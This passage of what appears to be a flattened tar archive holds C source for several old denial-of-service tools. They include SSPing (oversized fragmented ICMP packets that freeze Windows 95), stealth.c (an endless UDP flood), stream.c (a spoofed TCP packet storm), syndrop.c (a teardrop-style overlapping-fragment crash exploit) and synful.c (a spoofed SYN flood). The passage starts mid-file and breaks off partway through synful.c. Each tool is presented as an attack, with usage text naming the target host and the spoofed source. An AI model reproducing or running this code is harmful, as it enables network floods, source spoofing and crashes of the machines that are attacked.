            "      fprintf(stderr,\"Usage: %s <source> <src_port> <dest> <username> <number_of_packets>\\n\",*argv);",
            "      exit(1);",
            "   };",
            "   if(strlen(argv[4]) > 8) {",
            "      fprintf(stderr,\"Error: Username is too long\\n\");",
            "      exit(1);",
            "   }",
            "   if((he=gethostbyname(argv[1]))==NULL) {",
            "      fprintf(stderr,\"can't resolve source hostname\\n\");",
            "      exit(1);",
            "   };",
            "   bcopy(*(he->h_addr_list),(gram+12),4);",
            "   if((he=gethostbyname(argv[3]))==NULL) {",
            "      fprintf(stderr,\"can't resolve destination hostname\\n\");",
            "      exit(1);",
            "   };",
            "   bcopy(*(he->h_addr_list),(gram+16),4);",
            "   *(u_short*)(gram+20)=htons((u_short)atoi(argv[2]));",
            "   *(u_short*)(gram+22)=htons(MYPORT);",
            "   sprintf(message,\"%s@0\",argv[4]);",
            "   bcopy(message,(gram+28),strlen(message));",
            "   p=(struct sockaddr_in*)&sa;",
            "   p->sin_family=AF_INET;",
            "   bcopy(*(he->h_addr_list),&(p->sin_addr),sizeof(struct in_addr));",
            "   if((fd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))== -1) {",
            "      perror(\"socket\");",
            "      exit(1);",
            "   };",
            "#ifdef IP_HDRINCL",
            "   if (setsockopt(fd,IPPROTO_IP,IP_HDRINCL,(char*)&x,sizeof(x))<0)",
            "   {",
            "      perror(\"setsockopt IP_HDRINCL\");",
            "      exit(1);",
            "   };",
            "#else",
            "   fprintf(stderr,\"Error: We don't have IP_HDRINCL\\n\");",
            "#endif",
            "   fprintf(stderr,\"Spiffit v1, Flooding: \");",
            "   for (killloop=1;killloop<=atoi(argv[5]); killloop++) {",
            "      if((sendto(fd, &gram, sizeof(gram), 0,(struct sockaddr *)p,",
            "         sizeof(struct sockaddr)))== -1) {",
            "         perror(\"sendto\");",
            "         exit(1);",
            "      };",
            "   fprintf(stderr,\".\");",
            "   }",
            "   fprintf(stderr,\" Done!\\n\");",
            "datapool/src/ssping.c",
            "0100644",
            "0000000",
            "0000000",
            "00000007245",
            "07100656232",
            "013627",
            "ustar  ",
            "root",
            "root",
            "/* SSPing",
            " * Please, if you use my code give me credit.  Also, if i was the first to",
            " * find this glitch, please give me credit.  Thats all i ask.",
            " * Ok so all this does is build a really fraggmented over sized packet",
            " * and once win95 gets it, and puts it back together it locks.  I send",
            " * multiple packets by default cause some times it takes a few packets to",
            " * totally freeze the host.  Maybe its spending processor time to figure",
            " * out how to put them back together?  I've had reports of people blue",
            " * screening from it tho so we'll let Microsoft's boys figure out exactly",
            " * what this does to 95.  As of now i haven't tested it on NT, but maybe",
            " * i will later ;).  All of this source wasn't origonally written by me",
            " * I just took one of the old programs to kill POSIX and SYSV based",
            " * systems and worked on it abit, then made it spoof =). ",
            " *  Update: It apears to work on some older versions of mac os",
            "/* Yah this is for linux, but i like the BSD ip header better then linux's */",
            "#define __BSD_SOURCE",
            "#include <stdio.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/in_systm.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/ip_icmp.h>",
            "#include <string.h>",
            "#include <arpa/inet.h>",
            "int main(int argc, char **argv)",
            "\tint s,i;",
            "\tchar buf[400];",
            "\tstruct ip *ip = (struct ip *)buf;",
            "\tstruct icmphdr *icmp = (struct icmphdr *)(ip + 1);",
            "\tstruct hostent *hp, *hp2;",
            "\tstruct sockaddr_in dst;",
            "\tint offset;",
            "\tint on;",
            "\tint num = 5;",
            "\tif (argc < 3) {",
            "\t\tprintf(\"SSPing v1.0 Yet ANOTHER windows95(And macOS!) glitch\\n\");",
            "\t\tprintf(\"\\nusage: %s <dstaddr> <saddr> [number]\\n\",argv[0]);",
            "\t\tprintf(\"\\tdstaddr is the host your attacking\\n\");",
            "\t\tprintf(\"\\tsaddr is the host your spoofing from\\n\");",
            "\t\tprintf(\"\\tNumber is the number of packets to send, 5 is the default\\n\");",
            "\t\tprintf(\"\\nNOTE:  This is based on a bug that used to affect POSIX complient, and SYSV \\n\\t systems so its nothing new..\\n\");",
            "\t\tprintf(\"\\nGreets to Bill Gates! How do ya like this one? :-)\\n\");",
            "\t\texit(1);",
            "\tif (argc == 4) num = atoi(argv[3]);",
            "    for (i=1;i<=num;i++) {",
            "\ton=1;",
            "\tbzero(buf, sizeof buf);",
            "\tif ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW )) < 0) {",
            "\t\tperror(\"socket\");",
            "\t\texit(1);",
            "\tif (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {",
            "\t\tperror(\"IP_HDRINCL\");",
            "\t\texit(1);",
            "\tif ((hp = gethostbyname(argv[1])) == NULL) {",
            "\t\tif ((ip->ip_dst.s_addr = inet_addr(argv[1])) == -1) {",
            "\t\t\tfprintf(stderr, \"%s: unknown host\\n\", argv[1]);",
            "\t\t\texit(1);",
            "\t} else {",
            "\t\tbcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);",
            "\tif ((hp2 = gethostbyname(argv[2])) == NULL) {",
            "\t\tif ((ip->ip_src.s_addr = inet_addr(argv[2])) == -1) {",
            "\t\t\tfprintf(stderr, \"%s: unknown host\\n\", argv[2]);",
            "\t\t\texit(1);",
            "\t} else {",
            "\t\tbcopy(hp2->h_addr_list[0], &ip->ip_src.s_addr, hp->h_length);",
            "\tprintf(\"Sending to %s\\n\", inet_ntoa(ip->ip_dst));",
            "\tip->ip_v = 4;",
            "\tip->ip_hl = sizeof *ip >> 2;",
            "\tip->ip_tos = 0;",
            "\tip->ip_len = htons(sizeof buf);",
            "\tip->ip_id = htons(4321);",
            "\tip->ip_off = htons(0);",
            "\tip->ip_ttl = 255;",
            "\tip->ip_p = 1;",
            "/*\tip->ip_csum = 0;                  kernel fills in */",
            "\tdst.sin_addr = ip->ip_dst;",
            "\tdst.sin_family = AF_INET;",
            "\ticmp->type = ICMP_ECHO;",
            "\ticmp->code = 0;",
            "\ticmp->checksum = htons(~(ICMP_ECHO << 8));",
            "\tfor (offset = 0; offset < 65536; offset += (sizeof buf - sizeof *ip)) {",
            "\t\tip->ip_off = htons(offset >> 3);",
            "\t\tif (offset < 65120)",
            "\t\t\tip->ip_off |= htons(0x2000);",
            "\t\telse",
            "\t\t\tip->ip_len = htons(418);  /* make total 65538 */",
            "\t\tif (sendto(s, buf, sizeof buf, 0, (struct sockaddr *)&dst,",
            "\t\t\t\t\tsizeof dst) < 0) {",
            "\t\t\tfprintf(stderr, \"offset %d: \", offset);",
            "\t\t\tperror(\"sendto\");",
            "\t\tif (offset == 0) {",
            "\t\t\ticmp->type = 0;",
            "\t\t\ticmp->code = 0;",
            "\t\t\ticmp->checksum = 0;",
            "\tclose(s);",
            "    }",
            "\treturn 0;",
            "datapool/src/stealth.c",
            "0100644",
            "0000000",
            "0000000",
            "00000002561",
            "07071423100",
            "013755",
            "ustar  ",
            "root",
            "root",
            "#define BOMB_STRING \"0123456789ABCDE\"",
            "#define BOMB_SIZE 15",
            "#include <stdio.h>",
            "#include <sys/param.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#include <netdb.h>",
            "#include <stdarg.h>",
            "int echo_connect(char *, short);",
            "int echo_connect(char *server, short port)",
            "   struct sockaddr_in sin;",
            "   struct hostent *hp;",
            "   int thesock;",
            "   printf(\"\\n\");",
            "   printf(\"",
            "[1mStealth",
            "[0m> %s ",
            "[1;30m:",
            "[0m port %d\\n\", server, port);",
            "   hp = gethostbyname(server);",
            "   if (hp==NULL) {",
            "printf(\"",
            "[1mStealth",
            "[0m> Non",
            "[1;30m-",
            "[0mexistant host",
            "[1;30m:",
            "[0m %s\\n\",server);",
            "printf(\"\\n\");",
            "exit(0);",
            "   }",
            "   bzero((char*) &sin, sizeof(sin));",
            "   bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);",
            "   sin.sin_family = hp->h_addrtype;",
            "   sin.sin_port = htons(port);",
            "   thesock = socket(AF_INET, SOCK_DGRAM, 0);",
            "   connect(thesock,(struct sockaddr *) &sin, sizeof(sin));",
            "   return thesock;",
            "main(int argc, char **argv)",
            "   int s;",
            "   if(argc != 3)",
            "   {",
            "printf(\"\\n\");",
            "printf(\"",
            "[1;30mtw",
            "[0mit",
            "[1mch@St",
            "[0meal",
            "[1;30mth",
            "[33m:",
            "[0m\\n\");",
            "printf(\"\\n\");",
            "printf(\"",
            "[1;5;31mThis tool is extremely dangerous. Use at your own risk!",
            "[0m\\n\");",
            "printf(\"\\n\");",
            "printf(\"",
            "[1;30mUsage:",
            "[0m st",
            "[1m-",
            "[0mkill <",
            "[1mhost",
            "[0m> <",
            "[1mport",
            "[0m>\\n\");",
            "printf(\"\\n\");",
            "exit(0);",
            "   }",
            "   s=echo_connect(argv[1], atoi(argv[2]));",
            "   for(;;)",
            "   {",
            "send(s, BOMB_STRING, BOMB_SIZE, 0);",
            "   }",
            "datapool/src/stream.c",
            "0100644",
            "0000000",
            "0000000",
            "00000013403",
            "07066534555",
            "013626",
            "ustar  ",
            "root",
            "root",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <unistd.h>",
            "#include <strings.h>",
            "#include <sys/time.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#ifndef __USE_BSD",
            "#define\t__USE_BSD",
            "#endif",
            "#ifndef __FAVOR_BSD",
            "#define __FAVOR_BSD",
            "#endif",
            "#include <netinet/in_systm.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/tcp.h>",
            "#include <arpa/inet.h>",
            "#include <netdb.h>",
            "#ifdef LINUX",
            "#define FIX(x)\thtons(x)",
            "#else",
            "#define FIX(x)\t(x)",
            "#endif",
            "struct ip_hdr {",
            "    u_int\tip_hl:4,\t\t/* header length in 32 bit words */",
            "\t\tip_v:4;\t\t\t/* ip version */",
            "    u_char\tip_tos;\t\t\t/* type of service */",
            "    u_short\tip_len;\t\t\t/* total packet length */",
            "    u_short\tip_id;\t\t\t/* identification */",
            "    u_short\tip_off;\t\t\t/* fragment offset */",
            "    u_char\tip_ttl;\t\t\t/* time to live */",
            "    u_char\tip_p;\t\t\t/* protocol */",
            "    u_short\tip_sum;\t\t\t/* ip checksum */",
            "    u_long\tsaddr, daddr;\t\t/* source and dest address */",
            "struct tcp_hdr {",
            "    u_short\tth_sport;\t\t/* source port */",
            "    u_short\tth_dport;\t\t/* destination port */",
            "    u_long\tth_seq;\t\t\t/* sequence number */",
            "    u_long\tth_ack;\t\t\t/* acknowledgement number */",
            "    u_int\tth_x2:4,\t\t/* unused */",
            "\t\tth_off:4;\t\t/* data offset */",
            "    u_char\tth_flags;\t\t/* flags field */",
            "    u_short\tth_win;\t\t\t/* window size */",
            "    u_short\tth_sum;\t\t\t/* tcp checksum */",
            "    u_short\tth_urp;\t\t\t/* urgent pointer */",
            "struct tcpopt_hdr {",
            "    u_char  type;\t\t\t/* type */",
            "    u_char  len;\t\t\t\t/* length */",
            "    u_short value;\t\t\t/* value */",
            "struct pseudo_hdr {\t\t\t/* See RFC 793 Pseudo Header */",
            "    u_long saddr, daddr;\t\t\t/* source and dest address */",
            "    u_char mbz, ptcl;\t\t\t/* zero and protocol */",
            "    u_short tcpl;\t\t\t/* tcp length */",
            "struct packet {",
            "    struct ip/*_hdr*/ ip;",
            "    struct tcphdr tcp;",
            "/* struct tcpopt_hdr opt; */",
            "struct cksum {",
            "    struct pseudo_hdr pseudo;",
            "    struct tcphdr tcp;",
            "struct packet packet;",
            "struct cksum cksum;",
            "struct sockaddr_in s_in;",
            "u_short dstport, pktsize, pps;",
            "u_long dstaddr;",
            "int sock;",
            "void usage(char *progname)",
            "    fprintf(stderr, \"Usage: %s <dstaddr> <dstport> <pktsize> <pps>\\n\", ",
            "progname);",
            "    fprintf(stderr, \"    dstaddr  - the target we are trying to attack.\\n\");",
            "    fprintf(stderr, \"    dstport  - the port of the target, 0 = random.\\n\");",
            "    fprintf(stderr, \"    pktsize  - the extra size to use.  0 = normal ",
            "syn.\\n\");",
            "    exit(1);",
            "/* This is a reference internet checksum implimentation, not very fast */",
            "inline u_short in_cksum(u_short *addr, int len)",
            "    register int nleft = len;",
            "    register u_short *w = addr;",
            "    register int sum = 0;",
            "    u_short answer = 0;",
            "     /* Our algorithm is simple, using a 32 bit accumulator (sum), we add",
            "      * sequential 16 bit words to it, and at the end, fold back all the",
            "      * carry bits from the top 16 bits into the lower 16 bits. */",
            "     while (nleft > 1)  {",
            "         sum += *w++;",
            "         nleft -= 2;",
            "     }",
            "     /* mop up an odd byte, if necessary */",
            "     if (nleft == 1) {",
            "         *(u_char *)(&answer) = *(u_char *) w;",
            "         sum += answer;",
            "     }",
            "     /* add back carry outs from top 16 bits to low 16 bits */",
            "     sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */",
            "     sum += (sum >> 16);         \t/* add carry */",
            "     answer = ~sum;              \t/* truncate to 16 bits */",
            "     return(answer);",
            "u_long lookup(char *hostname)",
            "    struct hostent *hp;",
            "    if ((hp = gethostbyname(hostname)) == NULL) {",
            "       fprintf(stderr, \"Could not resolve %s.\\n\", hostname);",
            "       exit(1);",
            "    }",
            "    return *(u_long *)hp->h_addr;",
            "void flooder(void)",
            "    struct timespec ts;",
            "    int i;",
            "    memset(&packet, 0, sizeof(packet));",
            "    ts.tv_sec\t\t\t= 0;",
            "    ts.tv_nsec\t\t\t= 10;",
            "    packet.ip.ip_hl\t\t= 5;",
            "    packet.ip.ip_v\t\t= 4;",
            "    packet.ip.ip_p\t\t= IPPROTO_TCP;",
            "    packet.ip.ip_tos\t\t= 0x08;",
            "    packet.ip.ip_id \t\t= rand();",
            "    packet.ip.ip_len\t\t= FIX(sizeof(packet));",
            "    packet.ip.ip_off\t\t= 0; /* IP_DF? */",
            "    packet.ip.ip_ttl\t\t= 255;",
            "    packet.ip.ip_dst.s_addr\t= dstaddr;",
            "    packet.tcp.th_flags\t\t= 0;",
            "    packet.tcp.th_win\t\t= htons(16384);",
            "    packet.tcp.th_seq\t\t= random();",
            "    packet.tcp.th_ack\t\t= 0;",
            "    packet.tcp.th_off\t\t= 5; /* 5 */",
            "    packet.tcp.th_urp\t\t= 0;",
            "    packet.tcp.th_sport\t\t= rand();",
            "    packet.tcp.th_dport\t\t= dstport?htons(dstport):rand();",
            "    packet.opt.type\t\t= 0x02;",
            "    packet.opt.len\t\t= 0x04;",
            "    packet.opt.value\t\t= htons(1460);",
            "    cksum.pseudo.daddr\t\t= dstaddr;",
            "    cksum.pseudo.mbz\t\t= 0;",
            "    cksum.pseudo.ptcl\t\t= IPPROTO_TCP;",
            "    cksum.pseudo.tcpl\t\t= htons(sizeof(struct tcphdr));",
            "    s_in.sin_family\t\t= AF_INET;",
            "    s_in.sin_addr.s_addr\t\t= dstaddr;",
            "    s_in.sin_port\t\t= packet.tcp.th_dport;",
            "    for(i=0;;++i) {",
            "    cksum.pseudo.saddr = packet.ip.ip_src.s_addr = random();",
            "       ++packet.ip.ip_id;",
            "       ++packet.tcp.th_sport;",
            "       ++packet.tcp.th_seq;",
            "       if (!dstport)",
            "          s_in.sin_port = packet.tcp.th_dport = rand();",
            "       packet.ip.ip_sum\t\t= 0;",
            "       packet.tcp.th_sum\t\t= 0;",
            "       cksum.tcp\t\t\t= packet.tcp;",
            "       packet.ip.ip_sum\t\t= in_cksum((void *)&packet.ip, 20);",
            "       packet.tcp.th_sum\t\t= in_cksum((void *)&cksum, sizeof(cksum));",
            "       if (sendto(sock, &packet, sizeof(packet), 0, (struct sockaddr ",
            "*)&s_in, sizeof(s_in)) < 0)",
            "          perror(\"jess\");",
            "    }",
            "int main(int argc, char *argv[])",
            "    int on = 1;",
            "    printf(\"stream.c v1.0 - TCP Packet Storm\\n\");",
            "    if ((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {",
            "       perror(\"socket\");",
            "       exit(1);",
            "    }",
            "    setgid(getgid()); setuid(getuid());",
            "    if (argc < 4)",
            "       usage(argv[0]);",
            "    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < ",
            "0) {",
            "       perror(\"setsockopt\");",
            "       exit(1);",
            "    }",
            "    srand((time(NULL) ^ getpid()) + getppid());",
            "    printf(\"\\nResolving IPs...\"); fflush(stdout);",
            "    dstaddr\t= lookup(argv[1]);",
            "    dstport\t= atoi(argv[2]);",
            "    pktsize\t= atoi(argv[3]);",
            "    printf(\"Sending...\"); fflush(stdout);",
            "    flooder();",
            "    return 0;",
            "datapool/src/syndrop.c",
            "0100644",
            "0000000",
            "0000000",
            "00000020352",
            "07100656246",
            "014021",
            "ustar  ",
            "root",
            "root",
            "/*  syndrop.c",
            " *  by PineKoan",
            " *  stomp on M$ SYN sequence bug and the teardrop frag fuckup at same time!",
            " *  tcp instead of udp",
            " *  based on: Newtear.c",
            " *  which was: Copyright (c) 1997 route|daemon9  <route@infonexus.com>",
            " *  Linux/NT/95 Overlap frag bug exploit",
            " *  which was: Based off of:   flip.c by klepto",
            " *  Compiles on:    Linux, *BSD*",
            " *  gcc -O2 teardrop.c -o teardrop",
            " *      OR",
            " *  gcc -O2 syndrop.c -o syndrop -DSTRANGE_BSD_BYTE_ORDERING_THING",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <unistd.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/udp.h>",
            "#include <netinet/tcp.h>",
            "#include <arpa/inet.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <sys/socket.h>",
            "#ifdef STRANGE_BSD_BYTE_ORDERING_THING",
            "                        /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0 */",
            "#define FIX(n)  (n)",
            "#else                   /* OpenBSD 2.1, all Linux */",
            "#define FIX(n)  htons(n)",
            "#endif  /* STRANGE_BSD_BYTE_ORDERING_THING */",
            "#define TH_SYN  0x02",
            "#define IP_MF   0x2000  /* More IP fragment en route */",
            "#define IPH     0x14    /* IP header size */",
            "#define UDPH    0x8     /* UDP header size */",
            "#define TCPH    sizeof(struct tcphdr)   /* TCP header */",
            "#define PADDING 0x14    /* datagram frame padding for first packet */ ",
            "                          /* JD Change pad size to 20 decimal. */",
            "#define MAGIC   0x3     /* Magic Fragment Constant (tm).  Should be 2 or 3 */",
            "#define COUNT   0x11     /* Linux dies with 1, NT is more stalwart and can",
            "                         * withstand maybe 5 or 10 sometimes...  Experiment.",
            "                         * syndrop: gotta hit it at least 8 times.",
            "overflowing",
            "                         * some static sized buffer.  fools.",
            "                         */",
            "void usage(u_char *);",
            "u_long name_resolve(u_char *);",
            "u_short in_cksum(u_short *, int);",
            "void send_frags(int, u_long, u_long, u_short, u_short, u_long, u_long);",
            "int main(int argc, char **argv)",
            "    int one = 1, count = 0, i, rip_sock;",
            "    u_long  src_ip = 0, dst_ip = 0;",
            "    u_short src_prt = 0, dst_prt = 0;",
            "    u_long s_start = 0, s_end = 0;",
            "    struct in_addr addr;",
            "    fprintf(stderr, \"syndrop by PineKoan\\n\");",
            "    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "    {",
            "        perror(\"raw socket\");",
            "        exit(1);",
            "    }",
            "    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one,",
            "sizeof(one))",
            "        < 0)",
            "    {",
            "        perror(\"IP_HDRINCL\");",
            "        exit(1);",
            "    }",
            "    if (argc < 3) usage(argv[0]);",
            "    if (!(src_ip = name_resolve(argv[1])) || !(dst_ip =",
            "name_resolve(argv[2])))",
            "    {",
            "        fprintf(stderr, \"What the hell kind of IP address is that?\\n\");",
            "        exit(1);",
            "    }",
            "    while ((i = getopt(argc, argv, \"s:t:n:S:E:\")) != EOF)",
            "    {",
            "        switch (i)",
            "        {",
            "            case 's':               /* source port (should be emphemeral) */",
            "                src_prt = (u_short)atoi(optarg);",
            "                break;",
            "            case 't':               /* dest port (DNS, anyone?) */",
            "                dst_prt = (u_short)atoi(optarg);",
            "                break;",
            "            case 'n':               /* number to send */",
            "                count   = atoi(optarg);",
            "                break;",
            "            case 'S':               /* SYN sequence start */",
            "                s_start   = atoi(optarg);",
            "                break;",
            "            case 'E':               /* SYN sequence end */",
            "                s_end   = atoi(optarg);",
            "                break;",
            "            default :",
            "                usage(argv[0]);",
            "                break;              /* NOTREACHED */",
            "        }",
            "    }",
            "    srandom((unsigned)(time((time_t)0)));",
            "    if (!src_prt) src_prt = (random() % 0xffff);",
            "    if (!dst_prt) dst_prt = (random() % 0xffff);",
            "    if (!count)   count   = COUNT;",
            "    fprintf(stderr, \"Death on flaxen wings:\\n\");",
            "    addr.s_addr = src_ip;",
            "    fprintf(stderr, \"From: %15s.%5d\\n\", inet_ntoa(addr), src_prt);",
            "    addr.s_addr = dst_ip;",
            "    fprintf(stderr, \"  To: %15s.%5d\\n\", inet_ntoa(addr), dst_prt);",
            "    fprintf(stderr, \" Amt: %5d\\n\", count);",
            "    fprintf(stderr, \"[ \");",
            "    for (i = 0; i < count; i++)",
            "    {",
            "        send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt, s_start, s_end);",
            "        fprintf(stderr, \"b00m \");",
            "    }",
            "    fprintf(stderr, \"]\\n\");",
            "    return (0);",
            " *  Send two IP fragments with pathological offsets.  We use an implementation",
            " *  independent way of assembling network packets that does not rely on any of",
            " *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).",
            "void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt, u_short dst_prt, u_long seq1, u_long seq2)",
            "    u_char *packet = NULL, *p_ptr = NULL;   /* packet pointers */",
            "    u_char byte;                            /* a byte */",
            "    struct sockaddr_in sin;                 /* socket protocol structure */",
            "    sin.sin_family      = AF_INET;",
            "    sin.sin_port        = src_prt;",
            "    sin.sin_addr.s_addr = dst_ip;",
            "    /*",
            "     * Grab some memory for our packet, align p_ptr to point at the beginning",
            "     * of our packet, and then fill it with zeros.",
            "     */",
            "    packet = (u_char *)malloc(IPH + UDPH + PADDING);",
            "    p_ptr  = packet;",
            "    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);",
            "    byte = 0x45;                        /* IP version and header length */",
            "    memcpy(p_ptr, &byte, sizeof(u_char));",
            "    p_ptr += 2;                         /* IP TOS (skipped) */",
            "    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING);    /* total length */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(242);   /* IP id */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = 0x40;         /* IP TTL */",
            "    byte = IPPROTO_TCP;",
            "    memcpy(p_ptr + 1, &byte, sizeof(u_char));",
            "    p_ptr += 4;                         /* IP checksum filled in by kernel */",
            "    *((u_long *)p_ptr) = src_ip;        /* IP source address */",
            "    p_ptr += 4;",
            "    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */",
            "    p_ptr += 4;",
            "    *((u_short *)p_ptr) = htons(src_prt);       /* TCP source port */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(dst_prt);       /* TCP destination port */",
            "    p_ptr += 2;",
            "    *((u_long *)p_ptr) = seq1;          /* TCP sequence # */",
            "    p_ptr += 4;",
            "    *((u_long *)p_ptr) = 0;             /* ack */",
            "    p_ptr += 4;",
            "    *((u_short *)p_ptr) = htons(8 + PADDING*2);   /* TCP data offset */ ",
            "    /* Increases TCP total length to 48 bytes Which is too big! */",
            "    p_ptr += 2;",
            "    *((u_char *)p_ptr) = TH_SYN;        /* flags: mark SYN */",
            "    p_ptr += 1;",
            "    *((u_short *)p_ptr) = seq2-seq1;    /* window */",
            "    *((u_short *)p_ptr) = 0x44;          /* checksum : this is magic value for NT, W95.  dissasemble M$ C++ to see why, if you have time  */",
            "    *((u_short *)p_ptr) = 0;            /* urgent */",
            "    if (sendto(sock, packet, IPH + TCPH + PADDING, 0, (struct sockaddr*)&sin, sizeof(struct sockaddr)) == -1)",
            "    {",
            "        perror(\"\\nsendto\");",
            "        free(packet);",
            "        exit(1);",
            "    }",
            "    /*  We set the fragment offset to be inside of the previous packet's",
            "     *  payload (it overlaps inside the previous packet) but do not include",
            "     *  enough payload to cover complete the datagram.  Just the header will",
            "     *  do, but to crash NT/95 machines, a bit larger of packet seems to work",
            "     *  better.",
            "     */",
            "    p_ptr = &packet[2];  /* IP total length is 2 bytes into the header */",
            "    *((u_short *)p_ptr) = FIX(IPH + MAGIC + 1);",
            "    p_ptr += 4;                 /* IP offset is 6 bytes into the header */",
            "    *((u_short *)p_ptr) = FIX(MAGIC);",
            "    p_ptr = &packet[24];        /* hop in to the sequence again... */",
            "    *((u_long *)p_ptr) = seq2;          /* TCP sequence # */",
            "    if (sendto(sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *)&sin,",
            "                sizeof(struct sockaddr)) == -1)",
            "    {",
            "        perror(\"\\nsendto\");",
            "        free(packet);",
            "        exit(1);",
            "    }",
            "    free(packet);",
            "u_long name_resolve(u_char *host_name)",
            "    struct in_addr addr;",
            "    struct hostent *host_ent;",
            "    if ((addr.s_addr = inet_addr(host_name)) == -1)",
            "    {",
            "        if (!(host_ent = gethostbyname(host_name))) return (0);",
            "        bcopy(host_ent->h_addr, (char *) & addr.s_addr, host_ent->h_length);",
            "    }",
            "    return (addr.s_addr);",
            "void usage(u_char *name)",
            "    fprintf(stderr,",
            "            \"%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]\", name);",
            "    fprintf(stderr,",
            "            \"[ -S sequence_start] [ -E sequence_end ]\\n\");",
            "    exit(0);",
            "datapool/src/synful.c",
            "0100644",
            "0000000",
            "0000000",
            "00000013206",
            "07055665435",
            "013654",
            "ustar  ",
            "root",
            "root",
            "/* synful.c - SYN (SYN/ACK and ACK blow) written by \\\\StOrM\\\\ */",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <signal.h>",
            "#include <string.h>",
            "#include <unistd.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <sys/socket.h>",
            "#include <sys/time.h>",
            "#include <arpa/inet.h>",
            "#include <linux/ip.h>",
            "#include <linux/tcp.h>",
            "void dosynpacket(unsigned int, unsigned int, unsigned short, unsigned short);",
            "unsigned short in_cksum(unsigned short *, int);",
            "unsigned int host2ip(char *);",
            "main(int argc, char **argv)",
            "   unsigned int srchost;",
            "   char tmpsrchost[12];",
            "   int i,s1,s2,s3,s4;",
            "   unsigned int dsthost;",
            "   unsigned short port=80;",
            "   unsigned short random_port;",
            "   unsigned int number=1000;  ",
            "   printf(\"synful [It's so synful to send those spoofed SYN's]\\n\");",
            "   printf(\"Hacked out by \\\\\\\\StOrM\\\\\\\\\\n\\n\");",
            "   if(argc < 2)",
            "   {",
            "      printf(\"syntax: synful targetIP\\n\", argv[0]);",
            "      exit(0);",
            "   }",
            "/*   initrand(); */",
            "   dsthost = host2ip(argv[1]);",
            "   if(argc >= 3) port = atoi(argv[2]);",
            "   if(argc >= 4) number = atoi(argv[3]);",
            "   if(port == 0) port = 80;",
            "   if(number == 0) number = 1000;",
            "   printf(\"Destination  : %s\\n\",argv[1]);",
            "   printf(\"Port         : %u\\n\",port);",
            "   printf(\"NumberOfTimes: %d\\n\\n\", number);   ",
            "   for(i=0;i < number;i++)",
            "   {",
            "      s1 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));      ",
            "      s2 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));      ",
            "      s3 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));      ",
            "      s4 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));      ",
            "      random_port = 1+(int) (10000.0*rand()/(RAND_MAX+1.0));",
            "      sprintf(tmpsrchost,\"%d.%d.%d.%d\",s1,s2,s3,s4);",
            "      printf(\"Being Synful to %s at port %u from %s port %u\\n\", argv[1], port, tmpsrchost, random_port);",
            "      srchost = host2ip(tmpsrchost);",
            "      dosynpacket(srchost, dsthost, port, random_port);",
            "   }",
            "void dosynpacket(unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port, unsigned short ran_port) {",
            "   struct send_tcp",
            "   {",
            "      struct iphdr ip;",
            "      struct tcphdr tcp;",
            "   } send_tcp;",
            "   struct pseudo_header",
            "   {",
            "      unsigned int source_address;",
            "      unsigned int dest_address;",
            "      unsigned char placeholder;",
            "      unsigned char protocol;",
            "      unsigned short tcp_length;",
            "      struct tcphdr tcp;",
            "   } pseudo_header;",
            "   int tcp_socket;",
            "   struct sockaddr_in sin;",
            "   int sinlen;",
            "            ",
            "   /* form ip packet */",
            "   send_tcp.ip.ihl = 5;",
            "   send_tcp.ip.version = 4;",
            "   send_tcp.ip.tos = 0;",
            "   send_tcp.ip.tot_len = htons(40);",
            "   send_tcp.ip.id = ran_port;",
            "   send_tcp.ip.frag_off = 0;",
            "   send_tcp.ip.ttl = 255;",
            "   send_tcp.ip.protocol = IPPROTO_TCP;",
            "   send_tcp.ip.check = 0;",
            "   send_tcp.ip.saddr = source_addr;",
            "   send_tcp.ip.daddr = dest_addr;",
            "   /* form tcp packet */",
            "   send_tcp.tcp.source = ran_port;",
            "   send_tcp.tcp.dest = htons(dest_port);",
            "   send_tcp.tcp.seq = ran_port;   ",
            "   send_tcp.tcp.ack_seq = 0;",
            "   send_tcp.tcp.res1 = 0;",
            "   send_tcp.tcp.doff = 5;",
            "   send_tcp.tcp.fin = 0;",
            "   send_tcp.tcp.syn = 1;",
